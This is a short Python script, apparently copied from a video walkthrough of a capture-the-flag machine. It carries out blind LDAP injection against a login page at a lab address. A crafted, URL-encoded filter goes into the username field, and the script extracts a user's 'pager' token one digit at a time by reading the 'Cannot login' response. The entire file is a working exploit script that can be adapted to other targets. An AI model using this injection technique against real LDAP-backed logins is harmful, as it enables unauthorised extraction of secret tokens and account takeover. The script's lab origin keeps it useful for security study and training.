#!/usr/bin/python3

#
# From IppSec YouTube of CTF
#
# https://youtu.be/51JQg202csw
#


import requests
from time import sleep
import string
# from string import digits, lowercase
import sys

# token='2854494900113571565316515456523355707131674114457'
token = ''
url = "http://10.10.10.122/login.php"
attribute = "pager"
loop = 1

while loop > 0:
    for digit in string.digits:
        token = token
        query = f'ldapuser%29%28{attribute}%3d{token}{digit}%2a'
        data = { 'inputUsername' : query, 'inputOTP': '1234'}
        r = requests.post(url, data=data)
        sys.stdout.write(f"\rToken: {token}{digit}")
        sleep(1)
        if 'Cannot login' in r.text:
            token = token + digit
            break
        elif digit == "9":
            loop = 0
            break

sys.stdout.write(f"\rToken: {token}\n")        
